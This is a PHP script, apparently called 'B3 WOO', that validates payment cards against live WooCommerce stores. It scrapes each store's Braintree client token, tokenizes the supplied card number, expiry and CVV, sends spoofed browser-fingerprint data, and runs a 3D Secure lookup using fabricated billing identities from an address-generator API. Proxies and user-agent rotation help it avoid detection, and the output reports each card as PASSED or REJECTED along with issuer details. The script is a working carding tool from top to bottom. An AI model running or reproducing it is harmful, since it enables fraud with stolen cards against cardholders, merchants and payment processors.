<?php

# ------------- [ B3 WOO EDITED BY CURT ]

error_reporting(0);
date_default_timezone_set('Asia/Manila');

# ------------ [ TIMEZONE ] -------------------- #

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
    $time_start = microtime(true);
}
# ---------------- [ PHP ] ------------------- #

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);
$cc6 = substr($cc, 0, 6);

if (substr($cc, 0, 1) == '4') {
    $ctype = 'visa';
} elseif (substr($cc, 0, 1) == '5') {
    $ctype = 'mastercard';
} elseif (substr($cc, 0, 2) == '34' || substr($cc, 0, 2) == '37') {
    $ctype = 'americanexpress';
} elseif (substr($cc, 0, 4) == '6011' || substr($cc, 0, 2) == '65' || (substr($cc, 0, 6) >= '622126' && substr($cc, 0, 6) <= '622925')) {
    $ctype = 'discover';
} else {
    $ctype = 'unknown';
}

$brand = ($ctype === 'visa') ? 'Visa' : 
         (($ctype === 'mastercard') ? 'MasterCard' :
         (($ctype === 'americanexpress') ? 'American Express' : 
         (($ctype === 'discover') ? 'Discover' : 'Unknown')));

$ctype1 = ($ctype === 'visa') ? 'VI' : 
          (($ctype === 'mastercard') ? 'MC' : 
          (($ctype === 'americanexpress') ? 'AE' : 
          (($ctype === 'discover') ? 'DI' : null)));

$ctype2 = ($ctype === 'visa') ? 'Visa' : 
          (($ctype === 'mastercard') ? 'MasterCard' :
          (($ctype === 'americanexpress') ? 'American Express' : 
          (($ctype === 'discover') ? 'Discover' : null)));

$ctype3 = ($ctype === 'visa') ? 'VISA' : 
          (($ctype === 'mastercard') ? 'MASTERCARD' :
          (($ctype === 'americanexpress') ? 'AMERICAN EXPRESS' : 
          (($ctype === 'discover') ? 'DISCOVER' : null)));

$ctype4 = ($ctype === 'visa') ? '001' : 
          (($ctype === 'mastercard') ? '002' : 
          (($ctype === 'americanexpress') ? '003' : 
          (($ctype === 'discover') ? '004' : null)));

if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = (string) intval($mes);
    };
# -------------- [ FUNCTIONS ] -------- #


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
# ----------- [ random cookies ] ----- #

$inst = [
  'cookie' => mt_rand().'.txt'
];
$cookay = ''.getcwd().'/COOKIE';

if (!is_dir($cookay)) {
    mkdir($cookay, 0777, true);
}
$curttt1 = getcwd();
$curttzy = str_replace('\\', '/', $curttt1);

# ---------- [ FORMKEY ] --- #
function GetRandomWord($len = 20) {

    $word = array_merge(range('a', 'z'), range('A', 'Z'));

    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);
$Webkit = substr(str_shuffle(mt_rand().mt_rand().$Random), 0, 16);

# ---------------- [ DEVICE/CORRELATION ID ] ----- #
function DeviceID($length)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$DeviceSessionID = DeviceID(32);

#---------------- [ USER AGENT ] ------------------#

$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
];

// Pagpili ng random na user agent
$ua = $user_agents[array_rand($user_agents)];


    # -------------- [ START PROXY ] -------------- #
$proxyuser = '';

if (isset($_POST['proxy']) || isset($_GET['proxy'])) {
    $proxyuser = $_POST['proxy'] ?? $_GET['proxy'];
}

$proxy_port = '';
$user_pass = '';

if (!empty($proxyuser)) {
    $proxy_parts = explode(':', $proxyuser);
    
    if (count($proxy_parts) >= 2) {
        $proxy_port = $proxy_parts[0] . ':' . $proxy_parts[1];
    }

    if (count($proxy_parts) == 4) {
        $user_pass = $proxy_parts[2] . ':' . $proxy_parts[3];
    }
}

function setupCurlProxy($ch, $proxy_port, $user_pass) {
    if (!empty($proxy_port)) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    }
    if (!empty($user_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
    }
}

function fetchCurrentIp($proxy_port = '', $user_pass = '') {
    $ch = curl_init();
    $urlToGet = 'https://ip.zxq.co/';
    curl_setopt($ch, CURLOPT_URL, $urlToGet);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    // Set up proxy if provided
    if (!empty($proxy_port)) {
        setupCurlProxy($ch, $proxy_port, $user_pass);
    }

    // Execute cURL and get response
    $ipdata = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Handle cURL errors
    if ($ipdata === false) {
        $error = curl_error($ch);
         "cURL Error: $error\n";
        curl_close($ch);
        return false;
    }

    curl_close($ch);

    // Handle HTTP errors
    if ($http_code !== 200) {
        echo "HTTP Error: $http_code\n";
        return false;
    }

    // Decode JSON response and check if 'ip' field exists
    $responseData = json_decode($ipdata, true);
    if (isset($responseData['ip'])) {
        $query = $responseData['ip']; // Get the IP address

        // Mask the last two parts of the IP address
        $ipParts = explode('.', $query);
        $ipParts[2] = 'xxx';
        $ipParts[3] = 'xx';

        // Return the masked IP address
        return implode('.', $ipParts);
    } else {
         "IP address not found in the response.\n";
        return false;
    }
}

// Example usage:
$ip = fetchCurrentIp($proxy_port, $user_pass);
if ($ip !== false) {
     "Masked IP: $ip\n";
}

#--------------------- [ INPUT SITE ] ------------------#
ob_start();
$urls = explode(',', $_GET['website']);

$random_url = $urls[array_rand($urls)];
$parsed_url = parse_url(trim($random_url));
$product_page_url = $random_url;
$url2 = parse_url($product_page_url);
$hostname = $url2['host'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $product_page_url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'cache-control: max-age=0',
    'origin: https://' . $hostname,
    'authority: https://' . $hostname,
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'referer: https://' . $hostname . '/cart',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: ' . $ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIEFILE, "" . $curttt1 . "/COOKIE/" . $inst['cookie'] . "");
curl_setopt($ch, CURLOPT_COOKIEJAR, "" . $curttt1 . "/COOKIE/" . $inst['cookie'] . "");
$product_page_content = curl_exec($ch);
curl_close($ch);

$dom = new DOMDocument();
@$dom->loadHTML($product_page_content);
$xpath = new DOMXPath($dom);

$product_id = null;
$variation_data = null;
$errorresponse = null;

$form_nodes = $xpath->query('//form[@class="variations_form cart"]');
if ($form_nodes->length > 0) {
    $form_node = $form_nodes->item(0);
    $product_id = $form_node->getAttribute('data-product_id');
    $variation_data_attr = $form_node->getAttribute('data-product_variations');
    if ($variation_data_attr === "false") {
        $response = 'ATC Error: Failed to capture Variation ID';
    }
    
    $variation_data = json_decode(html_entity_decode($variation_data_attr), true);
}

if (!$product_id) {
    $product_id_node = $xpath->query('//input[@name="product_id" or @name="add-to-cart"]');
    if ($product_id_node->length > 0) {
        $product_id = $product_id_node->item(0)->getAttribute('value');
    }
}

if (!$product_id) {
    $button_node = $xpath->query('//button[@name="add-to-cart"]');
    if ($button_node->length > 0) {
        $product_id = $button_node->item(0)->getAttribute('value');
    }
}

if ($variation_data) {
    foreach ($variation_data as $variation) {
        $variation_id = $variation['variation_id'];
        $attributes = $variation['attributes'];

        foreach ($attributes as $key => $value) {
            // Process each attribute
        }
    }
}

if ($product_id) {
    $base_url = $product_page_url;
    $query_params = [
        'quantity' => 1,
        'add-to-cart' => $product_id
    ];

    if ($variation_data) {
        $first_variation = $variation_data[0];
        $variation_id = $first_variation['variation_id'];
        $attributes = $first_variation['attributes'];

        $query_params['attribute_' . key($attributes)] = reset($attributes);
        $query_params['product_id'] = $product_id;
        $query_params['variation_id'] = $variation_id;
    }

    $final_url = $base_url . '?' . http_build_query($query_params);

    // Output the final URL for adding to cart
     'Final URL: ' . $final_url;
} else {
    // Error response if product ID or variation ID cannot be found
    $errorresponse = 'CANNOT ADD TO CART';
}

// Output error response if applicable
if ($errorresponse) {
     $errorresponse;
}

   
#---------------- [ A D D R E S S ] --------------#

$urlComponents = parse_url($final_url);
$site2 = $urlComponents['host'];

if (str_ends_with($site2, '.co.uk') || str_ends_with($site2, '.uk.com')) {
    $country = 'GB';  // Set country to 'GB' for the UK
} elseif (str_ends_with($site2, '.au') || $site2 == 'www.spearfishingaustralia.com') {
    $country = 'AU';
} elseif (str_ends_with($site2, '.ca')) {
    $country = 'CA';
} elseif ($site2 == 'www.hdsecure-cctv.com' || $site2 == 'www.sellatronic.net') {
    $country = 'GB';  // Set country to 'GB' for specific sites
} elseif ($site2 == 'anapharmacy.com') {
    $country = 'AL';
} else {
    $country = 'US';
}

// Set the country for the API URL
$apiCountry = strtolower($country);
if ($apiCountry === 'gb') {
    $apiCountry = 'uk';  // Use 'uk' for the API request, but keep $country as 'GB'
}

$apiUrl = "https://xiaofomation.com/api/?country=" . $apiCountry;

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $apiUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => "",
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
]);

$deets = curl_exec($ch);

// Extract data but don't overwrite $country if it's 'GB'
$street = GetStr($deets, '"street":"', '",');
$city = GetStr($deets, '"city":"', '",');
$zip = GetStr($deets, '"zip":"', '",');
$state = GetStr($deets, '"state":"', '",');
$full_state = GetStr($deets, '"state_full":"', '",');
$regionID = GetStr($deets, '"region_id":"', '",');

// Only update $country from $deets if it's not 'GB'
if ($country !== 'GB') {
    $country = GetStr($deets, '"country":"', '",');
}
$fullcountry = GetStr($deets, '"country_full":"', '"}');
$full_name = GetStr($deets, '"full_name":"', '",');
$fname = GetStr($deets, '"first_name":"', '",');
$lname = GetStr($deets, '"last_name":"', '",');
$email = GetStr($deets, '"email":"', '",');

// Check if the country is Canada ('ca'), and use static phone if true
if ($apiCountry === 'ca') {
    $phone = '16308975248';  // Use this phone number for Canada
} else {
    $phone = GetStr($deets, '"phone":"', '",');  // Otherwise, use the phone from the API response
}

curl_close($ch);



# -------------------- [ ATC ] --------------- #
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $final_url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
   'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
$ATC = curl_exec($ch);
curl_close($ch);

if ($ATC) {
    $checkoutPattern = '/<a href="([^"]+)" class="button (checkout|btn-checkout) wc-forward">Checkout<\/a>|<a href="([^"]+)">Checkout<\/a>|<form[^>]+action="([^"]+)"[^>]*>/';

    if (preg_match($checkoutPattern, $response, $checkoutMatch)) {

        $checkout1 = $checkoutMatch[1] ?: $checkoutMatch[3] ?: $checkoutMatch[4];
         $checkout1;
    } else {
        $checkout1 = "https://$hostname/checkout";
    }
}

# -------------------- [ CHKOUT  ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $checkout1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");

$Checkout = curl_exec($ch);
curl_close($ch);
$nonce = trim(strip_tags(getStr($Checkout,'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$patterns = '/<tr class="order-total">.*?<th>Total<\/th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)<\/span>\s*([\d.]+)/s';
if (preg_match($patterns, $Checkout, $matches)) {
    $currency_symbol = $matches[1];
    $amount = $matches[2];
    if ($currency_symbol == '&pound;') {
        $currency_symbol = '£';
    }
}    
  $price1 = $currency_symbol . $amount;
  
$b3data = trim(strip_tags(getStr($Checkout,'var wc_braintree_client_token = ["','"];
')));
$process = base64_decode($b3data);
$bearer = GetStr($process,'"authorizationFingerprint":"','"');
// Decode the JSON response
$response = json_decode($process, true);

// Extract the value of merchantId
$merchantId = $response['merchantId'];
$clientid = GetStr($process,'"clientId":"','",');
$b3cli_id = GetStr($process,'"braintreeClientId":"','",'); 

# --------------- [ retries ] ----------- #

$retries = 0;

goers:
    
# ------------------ [ GRAPHQL ] ------------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'POST /graphql HTTP/1.1',
   'Host: payments.braintree-api.com',
   'User-Agent: '.$ua,
   'Authorization: Bearer '.$bearer,
   'Braintree-Version: 2018-05-10',
   'Content-Type: application/json',
   'Accept: */*',
   'Origin: https://assets.braintreegateway.com',
   'Referer: https://assets.braintreegateway.com/',
   'Accept-Language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$DeviceSessionID.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput\u0021) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"'.$zip.'","streetAddress":"'.$street.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$Grap = curl_exec($ch);
$Token = trim(strip_tags(getstr($Grap, '"token":"','"')));

#----------------- [ UUID ] ----------------#

// Generate a UUID
$reference_id = sprintf(
    '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    mt_rand(0, 0xffff), mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0x0fff) | 0x4000,
    mt_rand(0, 0x3fff) | 0x8000,
    mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
);

// Define the hostname (replace with your actual hostname)
$hostname2 = "$hostname";

// Prepare the payload
$data = [
    "Cookies" => [
        "Legacy" => true,
        "LocalStorage" => true,
        "SessionStorage" => true
    ],
    "DeviceChannel" => "Browser",
    "Extended" => [
        "Browser" => [
            "Adblock" => true,
            "AvailableJsFonts" => [],
            "DoNotTrack" => "unknown",
            "JavaEnabled" => false
        ],
        "Device" => [
            "ColorDepth" => 24,
            "Cpu" => "unknown",
            "Platform" => "Win32",
            "TouchSupport" => [
                "MaxTouchPoints" => 0,
                "OnTouchStartAvailable" => false,
                "TouchEventCreationSuccessful" => false
            ]
        ]
    ],
    "Fingerprint" => "7c79288432f448a03f8ce9a409873a1a",
    "FingerprintingTime" => 220,
    "FingerprintDetails" => ["Version" => "1.5.1"],
    "Language" => "en-US",
    "Latitude" => null,
    "Longitude" => null,
    "OrgUnitId" => "617c1af9299c0c318f3be597",
    "Origin" => "Songbird",
    "Plugins" => [
        "bVSRIEK::TsWq89999HqdOmyCJECgQIECgYz4cOu::~a05",
        "ZrVxgvfu::IMtePPuXTw3bNtePHDBfXq0iZUpzhQIM::~4k5",
        "JavaScript doc Viewer::Portable Document Format::application/x-google-chrome-pdf~pdf",
        "OpenSource doc Viewer::::application/pdf~pdf"
    ],
    "ReferenceId" => "0_" . $reference_id,
    "Referrer" => "https://{$hostname2}/",
    "Screen" => [
        "FakedResolution" => false,
        "Ratio" => 1.8823529411764706,
        "Resolution" => "1536x816",
        "UsableResolution" => "1536x816",
        "CCAScreenSize" => "02"
    ],
    "CallSignEnabled" => null,
    "ThreatMetrixEnabled" => false,
    "ThreatMetrixEventType" => "PAYMENT",
    "ThreatMetrixAlias" => "Default",
    "TimeOffset" => -480,
    "UserAgent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "UserAgentDetails" => ["FakedOS" => false, "FakedBrowser" => false],
    "BinSessionId" => "339cb524-c910-4c4d-ad98-975647223c76"
];

// Initialize cURL
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, "https://geoissuer.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

// Execute cURL request and get the response
$response = curl_exec($ch);

// Close cURL
curl_close($ch);

#----------------- [ 3D SECURE ] --------------#

if (strpos($process, '"threeDSecureEnabled":true')) {
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.braintreegateway.com/merchants/$merchantId/client_api/v1/payment_methods/$Token/three_d_secure/lookup");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: api.braintreegateway.com',
   'User-Agent: '.$ua,
   'Content-Type: application/json',
   'Accept: */*',
   'Origin: https://'.$hostname,
   'Referer: https://'.$hostname,
   'Accept-Language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_COOKIEJAR, "".$curttt1."/COOKIE/".$inst['cookie']."");
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"'.$amount.'","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-US","browserScreenHeight":873,"browserScreenWidth":393,"browserTimeZone":-480,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"'.$fname.'","shippingSurname":"'.$lname.'","ipAddress":"'.$query.'","billingLine1":"'.$street.'","billingLine2":"","billingCity":"'.$city.'","billingState":"'.$state.'","billingPostalCode":"'.$zip.'","billingCountryCode":"'.$country.'","billingPhoneNumber":"'.$phone.'","billingGivenName":"'.$fname.'","billingSurname":"'.$lname.'","shippingLine1":"'.$street.'","shippingLine2":"","shippingCity":"'.$city.'","shippingState":"","shippingPostalCode":"'.$zip.'","shippingCountryCode":"'.$country.'","email":"'.$email.'"},"bin":"'.$cc6.'","dfReferenceId":"0_'.$reference_id.'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.106.0","cardinalDeviceDataCollectionTimeElapsed":13,"issuerDeviceDataCollectionTimeElapsed":1,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.106.0","_meta":{"merchantAppId":"'.$hostname.'","platform":"web","sdkVersion":"3.106.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$DeviceSessionID.'"}}' );

$lookup = curl_exec($ch);
$data = json_decode($lookup, true);

if (json_last_error() === JSON_ERROR_NONE) {
    // Kunin ang liabilityShifted mula sa threeDSecureInfo
    $liabilityShifted = isset($data['paymentMethod']['threeDSecureInfo']['liabilityShifted']) ? $data['paymentMethod']['threeDSecureInfo']['liabilityShifted'] : null;

    // Kunin ang status mula sa threeDSecureInfo
    $status = isset($data['paymentMethod']['threeDSecureInfo']['status']) ? $data['paymentMethod']['threeDSecureInfo']['status'] : null;

    // Kunin ang cardType mula sa details
    $cardType = isset($data['paymentMethod']['details']['cardType']) ? $data['paymentMethod']['details']['cardType'] : null;

    // Kunin ang issuingBank mula sa binData
    $issuingBank = isset($data['paymentMethod']['binData']['issuingBank']) ? $data['paymentMethod']['binData']['issuingBank'] : null;

    // Kunin ang countryOfIssuance mula sa binData
    $countryOfIssuance = isset($data['paymentMethod']['binData']['countryOfIssuance']) ? $data['paymentMethod']['binData']['countryOfIssuance'] : null;

    // Kunin ang prepaid mula sa binData
    $prepaid = isset($data['paymentMethod']['binData']['prepaid']) ? $data['paymentMethod']['binData']['prepaid'] : null;

    // Kunin ang debit mula sa binData
    $debit = isset($data['paymentMethod']['binData']['debit']) ? $data['paymentMethod']['binData']['debit'] : null;
} else {
    $liabilityShifted = null;
    $status = null;
    $cardType = null;
    $issuingBank = null;
    $countryOfIssuance = null;
    $prepaid = null;
    $debit = null;
}
curl_close($ch);
    }
# ------------ [ UNLINK COOKIE ] ---------- #

unlink("".$moriiii."/COOKIE/".$inst['cookie']."");
ob_flush();
curl_close($ch);

# ------------- [ RESPONSES ] ------------------ #
$time_total = round(microtime(true) - $time_start);
// Ensure $Site starts with http:// or https:// for correct redirection
if (strpos($hostname, 'http://') === false && strpos($hostname, 'https://') === false) {
    $hostname1 = 'http://' . $hostname;
}
$fontStyle = 'font-family: Arial, sans-serif; font-weight: bold;';

if (strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . ' <a href="' . $hostname1. '" target="_blank">SITE</a> <br><br>';
    
    // Info line with conditional Debit and Prepaid display
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }

    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';

} else {
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . ' <a href="' . $hostname1. '" target="_blank">SITE</a> <br><br>';
    
    // Info line with conditional Debit and Prepaid display
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);

    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }

    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}
?>